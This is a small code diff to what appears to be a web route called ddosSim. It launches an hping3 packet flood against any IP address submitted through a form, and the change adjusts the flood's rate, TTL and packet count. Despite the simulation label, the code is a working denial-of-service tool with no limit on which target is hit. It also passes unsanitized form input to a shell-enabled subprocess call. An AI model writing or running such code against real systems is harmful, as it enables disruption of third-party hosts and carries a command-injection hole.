@@ -11,9 +11,9 @@ def ddosSim():
         IP = request.form['ip']
         time = request.form['timeout']
 
-        p = subprocess.Popen(["hping3", "-L", "0000", "-p", "++80", "-S", "-c", "100000", \
-                              "-Q", "-V", "--id", "0xaaaa", "-i", "u1", "-w", "5000", \
-                              "--ttl", "254", IP], stdout=subprocess.PIPE, shell=True)
+        p = subprocess.Popen(["hping3", "-L", "0000", "-p", "++80", "-c", packetcount, \
+                              "--id", "0xaaaa", "-i", "u5", "--ttl", "128", IP], \
+                             stdout=subprocess.PIPE, shell=True)
 
         try:
            output = p.communicate(timeout=int(time))
